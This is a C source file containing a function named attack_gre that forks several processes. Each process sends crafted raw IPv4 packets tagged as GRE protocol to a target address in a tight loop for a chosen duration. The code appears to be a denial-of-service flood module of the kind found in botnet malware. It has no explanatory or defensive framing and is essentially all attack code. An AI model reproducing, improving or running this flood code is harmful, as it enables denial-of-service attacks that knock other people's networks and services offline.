#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define IPPROTO_GRE 47

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void attack_gre(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            int sock = socket(AF_INET, SOCK_RAW, IPPROTO_GRE);
            if (sock < 0) {
                exit(0);
            }

            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            inet_pton(AF_INET, target, &addr.sin_addr);

            char packet[sizeof(struct iphdr) + 20];
            struct iphdr *ip = (struct iphdr *)packet;

            while (time(NULL) < end) {
                memset(packet, 0, sizeof(packet));
                
                ip->ihl = 5;
                ip->version = 4;
                ip->tos = 0;
                ip->tot_len = htons(sizeof(struct iphdr) + 20);
                ip->id = htons(rand() % 65535);
                ip->frag_off = 0;
                ip->ttl = 64;
                ip->protocol = IPPROTO_GRE;
                ip->saddr = inet_addr("0.0.0.0");
                ip->daddr = addr.sin_addr.s_addr;
                ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

                sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr));
                usleep(50);
            }
            close(sock);
            exit(0);
        }
    }
}